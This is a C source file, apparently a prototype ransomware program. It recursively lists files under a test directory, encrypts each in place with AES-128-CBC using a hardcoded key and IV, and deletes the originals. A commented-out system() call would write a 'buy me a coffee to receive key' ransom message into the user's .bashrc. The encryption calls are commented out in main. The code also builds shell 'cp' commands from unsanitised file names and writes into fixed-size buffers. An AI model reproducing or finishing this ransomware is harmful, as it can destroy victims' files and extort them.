#include <dirent.h>
#include <stdio.h>
#include <errno.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <mcrypt.h>

char** list_all_files;
int count_files = 0;
char* IV = "AAAAAAAAAAAAAAAA";
char* key = "0123456789abcdef";
int keysize = 16; /* 128 bits */
int buffer_length = 16;
unsigned char buffer[16];
//typedef unsigned char byte;
//byte* buffer;

void list_files(char * path){
    DIR *d = opendir(path);
    struct dirent *dir;
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            //Condition to check regular file.
            if(dir->d_type==DT_REG){
                list_all_files[count_files] = (char*)malloc(1000);
                sprintf(list_all_files[count_files++],"%s/%s",path, dir->d_name);
            }
            else if (dir -> d_type == DT_DIR && strcmp(dir->d_name,".")!=0 && strcmp(dir->d_name,"..")!=0 ){
                char d_path[255];
                sprintf(d_path, "%s/%s", path, dir->d_name);
                list_files(d_path);
            }
        }
        closedir(d);
    }
}

int encrypt(void* buffer){
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    //if( buffer_len % blocksize != 0 ){return 1;}

    mcrypt_generic_init(td, key, 16, IV);
    mcrypt_generic(td, buffer, buffer_length);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);

    return 0;
}

int decrypt(void* buffer){
    MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
    int blocksize = mcrypt_enc_get_block_size(td);
    //if( buffer_len % blocksize != 0 ){return 1;}

    mcrypt_generic_init(td, key, 16, IV);
    mdecrypt_generic(td, buffer, buffer_length);
    mcrypt_generic_deinit (td);
    mcrypt_module_close(td);

    return 0;
}

void encrypt_file(char * path){
    FILE *fp = fopen(path, "rb");
    FILE *fp_temp = fopen("temp.tmp", "wb");

    if (fp == NULL || fp_temp == NULL)
    {
        /* Unable to open file hence exit */
        printf("\nUnable to open file.\n");
        printf("Please check whether file exists and you have read/write privilege.\n");
        exit(EXIT_SUCCESS);
    }
    //buffer = (byte*)malloc(buffer_length);
    fseek(fp, SEEK_SET, 0);
    while (!feof(fp))
    {
        fread(buffer, 16, 1, fp);
        encrypt(buffer);
        fwrite(buffer, 16, 1, fp_temp);
        fflush(fp_temp);
        memset(buffer, '\0', buffer_length);
    }
    fclose(fp);
    fclose(fp_temp);

    remove(path);

    char * cmd = (char*) malloc(sizeof(char*)*1000);
    sprintf(cmd,"cp %s %s", "temp.tmp", path);
    system(cmd);
    free(cmd);
    remove("temp.tmp");
}

void decrypt_file(char * path){
    FILE *fp = fopen(path, "rb");
    FILE *fp_temp = fopen("temp.tmp", "wb");

    if (fp == NULL || fp_temp == NULL)
    {
        /* Unable to open file hence exit */
        printf("\nUnable to open file.\n");
        printf("Please check whether file exists and you have read/write privilege.\n");
        exit(EXIT_SUCCESS);
    }
    fseek(fp, SEEK_SET, 0);
    while (!feof(fp))
    {
        fread(buffer, 16, 1, fp);
        if(feof(fp)) break;
        decrypt(buffer);
        fwrite(buffer, sizeof(buffer), 1, fp_temp);
        fflush(fp_temp);
        memset(buffer, '\0', buffer_length);
    }
    fclose(fp);
    fclose(fp_temp);

    /* Delete original source file */
    remove(path);

    /* Rename temp file as original file */
    char * cmd = (char*) malloc(sizeof(char*)*1000);
    sprintf(cmd,"cp %s %s", "temp.tmp", path);
    system(cmd);
    free(cmd);
}


int main()
{
    list_all_files = malloc(1000*sizeof(char*));

    char path[1000]="/home/doanhnn/linux/test";
    list_files(path);
    for(int i =0; i< count_files; i++){
        printf("%s\n", list_all_files[i]);
        //encrypt_file(list_all_files[i]);
        //system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then"
        //    " echo \"echo \"Your data is encrypted, buy me a coffee to receive"
        //    " key to decrypt your data\"\" >> $file; fi");
        //decrypt_file(list_all_files[i]);
    }
    return(0);
}
